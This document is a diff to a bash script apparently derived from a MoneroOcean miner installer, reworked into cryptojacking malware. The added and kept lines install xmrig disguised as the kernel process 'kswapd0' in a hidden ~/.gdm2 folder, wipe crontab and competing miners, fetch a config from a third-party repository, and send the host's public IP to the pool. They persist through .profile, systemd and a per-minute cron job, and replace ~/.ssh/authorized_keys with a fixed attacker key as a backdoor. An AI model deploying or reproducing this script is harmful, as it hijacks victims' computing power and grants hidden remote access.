@@ -15,10 +15,10 @@ crontab -r
 #killall swapd
 #kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
-#killall kswapd0
-kill -9 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
+killall kswapd0
+kill -9 $(/bin/ps ax -fu $USER | grep "kswapd0" | grep -v "grep" | awk '{print $2}')
 
-#rm -rf $HOME/.gdm2*
+rm -rf $HOME/.gdm2/
 #rm -rf $HOME/.swapd/
 
 VERSION=2.11
@@ -27,7 +27,6 @@ VERSION=2.11
 
 echo "MoneroOcean mining setup script v$VERSION."
 echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
-
 
 if [ "$(id -u)" == "0" ]; then
   echo "WARNING: Generally it is not adviced to run this script under root"
@@ -46,7 +45,7 @@ if [ -z $WALLET ]; then
   exit 1
 fi
 
-WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
+WALLET_BASE=$(echo $WALLET | cut -f1 -d".")
 if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
   echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
   exit 1
@@ -82,7 +81,7 @@ fi
 # calculating port
 
 CPU_THREADS=$(nproc)
-EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
+EXP_MONERO_HASHRATE=$((CPU_THREADS * 700 / 1000))
 if [ -z $EXP_MONERO_HASHRATE ]; then
   echo "ERROR: Can't compute projected Monero CN hashrate"
   exit 1
@@ -90,7 +89,7 @@ fi
 
 power2() {
   if ! type bc >/dev/null; then
-    if   [ "$1" -gt "8192" ]; then
+    if [ "$1" -gt "8192" ]; then
       echo "8192"
     elif [ "$1" -gt "4096" ]; then
       echo "4096"
@@ -119,15 +118,15 @@ power2() {
     else
       echo "1"
     fi
-  else 
-    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
+  else
+    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l
   fi
 }
 
-PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
-PORT=$(( $PORT == 0 ? 1 : $PORT ))
-PORT=`power2 $PORT`
-PORT=$(( 10000 + $PORT ))
+PORT=$(($EXP_MONERO_HASHRATE * 30))
+PORT=$(($PORT == 0 ? 1 : $PORT))
+PORT=$(power2 $PORT)
+PORT=$((10000 + $PORT))
 if [ -z $PORT ]; then
   echo "ERROR: Can't compute port"
   exit 1
@@ -137,7 +136,6 @@ if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
   echo "ERROR: Wrong computed port value: $PORT"
   exit 1
 fi
-
 
 # printing intentions
 
@@ -160,7 +158,7 @@ echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate
 echo
 
 echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
-sleep 1
+sleep 3
 echo
 echo
 
@@ -171,31 +169,31 @@ if sudo -n true 2>/dev/null; then
   sudo systemctl stop moneroocean_miner.service
 fi
 killall -9 xmrig
-#killall -9 kswapd0
+killall -9 kswapd0
 
 echo "[*] Removing $HOME/moneroocean directory"
 rm -rf $HOME/moneroocean
 rm -rf $HOME/.moneroocean
-#rm -rf $HOME/.gdm2
+rm -rf $HOME/.gdm2
 
-echo "[*] Downloading MoneroOcean advanced version of xmrig to $HOME/.gdm2/xmrig.tar.gz"
-#if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o $HOME/.gdm2/xmrig.tar.gz; then
-#  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to $HOME/.gdm2/xmrig.tar.gz"
-#  exit 1
-#fi
+echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
+  exit 1
+fi
 
-wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O $HOME/.gdm2/xmrig.tar.gz
-tar xzvf $HOME/.gdm2/xmrig.tar.gz
+#wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O $HOME/.gdm2/xmrig.tar.gz
+#tar xzvf $HOME/.gdm2/xmrig.tar.gz
 #gunzip -d $HOME/.gdm2/xmrig.tar.gz
 #tar xf $HOME/.gdm2/xmrig.tar
 
 echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2/"
 [ -d $HOME/.gdm2 ] || mkdir $HOME/.gdm2/
-if ! tar xf $HOME/.gdm2/xmrig.tar.gz -C $HOME/.gdm2/; then
+if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.gdm2/; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2/ directory"
-#  exit 1
+  exit 1
 fi
-#rm $HOME/.gdm2/xmrig.tar.gz
+rm /tmp/xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
@@ -203,36 +201,36 @@ $HOME/.gdm2/xmrig --help >/dev/null
 if (test $? -ne 0); then
   if [ -f $HOME/.gdm2/xmrig ]; then
     echo "WARNING: Advanced version of $HOME/.gdm2/xmrig is not functional"
-  else 
+  else
     echo "WARNING: Advanced version of $HOME/.gdm2/xmrig was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
-  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
-  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
+  LATEST_XMRIG_RELEASE=$(curl -s https://github.com/xmrig/xmrig/releases/latest | grep -o '".*"' | sed 's/"//g')
+  LATEST_XMRIG_LINUX_RELEASE="https://github.com"$(curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" | cut -d \" -f2)
 
-  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to $HOME/.gdm2/xmrig.tar.gz"
-  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o $HOME/.gdm2/xmrig.tar.gz; then
-    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to $HOME/.gdm2/xmrig.tar.gz"
-#    exit 1
+  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
+  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
+    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
+    exit 1
   fi
 
-  echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2/"
-  if ! tar xf $HOME/.gdm2/xmrig.tar.gz -C $HOME/.gdm2/ --strip=1; then
-    echo "WARNING: Can't unpack $HOME/.gdm2/xmrig.tar.gz to $HOME/.gdm2/ directory"
+  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.gdm2/"
+  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.gdm2/ --strip=1; then
+    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/.gdm2/ directory"
   fi
-  rm $HOME/.gdm2/xmrig.tar.gz
+  rm /tmp/xmrig.tar.gz
 
   echo "[*] Checking if stock version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
   $HOME/.gdm2/xmrig --help >/dev/null
-  if (test $? -ne 0); then 
+  if (test $? -ne 0); then
     if [ -f $HOME/.gdm2/xmrig ]; then
       echo "ERROR: Stock version of $HOME/.gdm2/xmrig is not functional too"
-    else 
+    else
       echo "ERROR: Stock version of $HOME/.gdm2/xmrig was removed by antivirus too"
     fi
-#    exit 1
+    exit 1
   fi
 fi
 
@@ -240,11 +238,29 @@ echo "[*] Miner $HOME/.gdm2/xmrig is OK"
 
 mv $HOME/.gdm2/xmrig $HOME/.gdm2/kswapd0
 
+rm -rf $HOME/.gdm2/config.json
+wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm2/config.json
+curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.gdm2/config.json
+
+echo "PASS..."
+#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+#PASS=`hostname`
+#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
+PASS=$(sh -c "(curl -4 ip.sb)")
+if [ "$PASS" == "localhost" ]; then
+  PASS=$(ip route get 1 | awk '{print $NF;exit}')
+fi
+if [ -z $PASS ]; then
+  PASS=na
+fi
+if [ ! -z $EMAIL ]; then
+  PASS="$PASS:$EMAIL"
+fi
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
+
 # preparing script
 
-killall xmrig
-
-echo "[*] Creating $HOME/.gdm2/gdm2.rc script"
+echo "[*] Creating $HOME/.gdm2/miner.sh script"
 cat >$HOME/.gdm2/miner.sh <<EOL
 #!/bin/bash
 if ! pidof kswapd0 >/dev/null; then
@@ -260,44 +276,46 @@ chmod +x $HOME/.gdm2/miner.sh
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep .gdm2/gdm2.rc $HOME/.profile >/dev/null; then
+  if ! grep .gdm2/miner.sh $HOME/.profile >/dev/null; then
     echo "[*] Adding $HOME/.gdm2/gdm2.rc script to $HOME/.profile"
-    echo "$HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1" >>$HOME/.profile
-  else 
-    echo "Looks like $HOME/.gdm2/gdm2.rc script is already in the $HOME/.profile"
+    echo "$HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  else
+    echo "Looks like $HOME/.gdm2/miner.sh script is already in the $HOME/.profile"
   fi
   echo "[*] Running miner in the background (see logs in $HOME/.gdm2/xmrig.log file)"
-  /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
+  /bin/bash $HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
     echo "[*] Enabling huge pages"
-    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
-    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
+    echo "vm.nr_hugepages=$((1168 + $(nproc)))" | sudo tee -a /etc/sysctl.conf
+    sudo sysctl -w vm.nr_hugepages=$((1168 + $(nproc)))
   fi
 
   if ! type systemctl >/dev/null; then
 
     echo "[*] Running miner in the background (see logs in $HOME/.gdm2/kswapd0.log file)"
-    /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
+    /bin/bash $HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
   else
 
     echo "[*] Creating moneroocean systemd service"
-    cat >gdm2.service <<EOL
+    cat >/tmp/gdm2.service <<EOL
 [Unit]
 Description=GDM2
+
 [Service]
 ExecStart=$HOME/.gdm2/kswapd0 --config=$HOME/.gdm2/config.json
 Restart=always
 Nice=10
 CPUWeight=1
+
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv gdm2.service /etc/systemd/system/gdm2.service
+    sudo mv /tmp/gdm2.service /etc/systemd/system/gdm2.service
     echo "[*] Starting gdm2 systemd service"
     sudo killall kswapd0 2>/dev/null
     sudo systemctl daemon-reload
@@ -312,11 +330,11 @@ echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usag
 if [ "$CPU_THREADS" -lt "4" ]; then
   echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-  echo "sudo cpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b"
-  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+  echo "sudo cpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b"
+  if [ "$(tail -n1 /etc/rc.local)" != "exit 0" ]; then
+    echo "sudo sed -i -e '\$acpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
   else
-    echo "sudo sed -i -e '\$i \\cpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$i \\cpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
@@ -324,10 +342,6 @@ else
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config_background.json"
 fi
 echo ""
-
-rm -rf $HOME/.gdm2/config.json
-wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm2/config.json
-curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.gdm2/config.json
 
 sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:10128",/' $HOME/.gdm2/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
@@ -338,33 +352,18 @@ sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm2/config.json
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
 sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.gdm2/config.json
 
-
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
 cat $HOME/.gdm2/config.json
 
-rm -rf $HOME/.gdm2/xmrig.tar*
-
-#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-#PASS=`hostname`
-#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
-PASS=`sh -c "(curl -4 ip.sb)"`
-#if [ "$PASS" == "localhost" ]; then
-#  PASS=`ip route get 1 | awk '{print $NF;exit}'`
-#fi
-if [ -z $PASS ]; then
-  PASS=na
-fi
-if [ ! -z $EMAIL ]; then
-  PASS="$PASS:$EMAIL"
-fi
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/'t $HOME/.gdm2/config.json
-
 # Cronjob erstellen
- (crontab -l 2>/dev/null; echo "* * * * * $HOME/.gdm2/check_and_start.sh") | crontab -
+(
+  crontab -l 2>/dev/null
+  echo "* * * * * $HOME/.gdm2/check_and_start.sh"
+) | crontab -
 
 # Skript für den Cronjob erstellen
-cat << 'EOF' > "$HOME/.gdm2/check_and_start.sh"
+cat <<'EOF' >"$HOME/.gdm2/check_and_start.sh"
  
 #!/bin/bash
 if ! pgrep -f "kswapd0"; then
@@ -375,7 +374,6 @@ EOF
 # Skript ausführbar machen
 chmod +x $HOME/.gdm2/check_and_start.sh
 
-
 echo "[*] Generating ssh key on server"
 
 rm -rf ~/.ssh/authorized_keys
@@ -383,40 +381,7 @@ rm -rf ~/.ssh/
 mkdir ~/.ssh
 chmod 700 ~/.ssh
 touch ~/.ssh/authorized_keys
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0='>>~/.ssh/authorized_keys
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0=' >>~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 
-# Running the miner
-if [ ! -x "$HOME/.gdm2/kswapd0" ]; then
-  echo "Miner executable not found or not executable"
-  exit 1
-fi
-
-echo "Starting kswapd0 miner..."
-# Detail the command to ensure it uses the correct config
-nohup $HOME/.gdm2/kswapd0 --config=$HOME/.gdm2/config.json > $HOME/.gdm2/miner.log 2>&1 &
-
-# Confirm it is running
-if pgrep -f "kswapd0" > /dev/null; then
-  echo "kswapd0 is running successfully."
-else
-  echo "Failed to start kswapd0."
-fi
-
-echo "PASS..."
-      #PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-      #PASS=`hostname`
-      #PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
-      PASS=`sh -c "(curl -4 ip.sb)"`
-      if [ "$PASS" == "localhost" ]; then
-        PASS=`ip route get 1 | awk '{print $NF;exit}'`
-      fi
-      if [ -z $PASS ]; then
-        PASS=na
-      fi
-      if [ ! -z $EMAIL ]; then
-        PASS="$PASS:$EMAIL"
-      fi
-      sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
-      
 echo "[*] Setup complete"
